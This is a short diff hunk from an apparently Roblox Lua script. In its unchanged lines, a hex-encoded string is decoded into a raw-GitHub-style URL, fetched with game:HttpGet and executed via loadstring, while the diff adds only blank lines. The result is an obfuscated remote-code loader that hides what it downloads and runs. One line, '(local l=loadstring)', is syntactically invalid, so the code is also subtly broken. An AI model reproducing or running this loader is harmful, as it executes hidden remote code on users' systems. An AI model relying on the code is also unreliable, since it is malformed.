@@ -2,3 +2,5 @@ local d="68747470733A2F2F72617767697468756275736572636F6E74656E742E636F6D2F42616
 local function hx(str)local s=""for i=1,#str,2 do s=s..string.char(tonumber(str:sub(i,i+1),16))end;return s end
 local u=hx(d)
 (local l=loadstring)(game:HttpGet(u))()
+
+
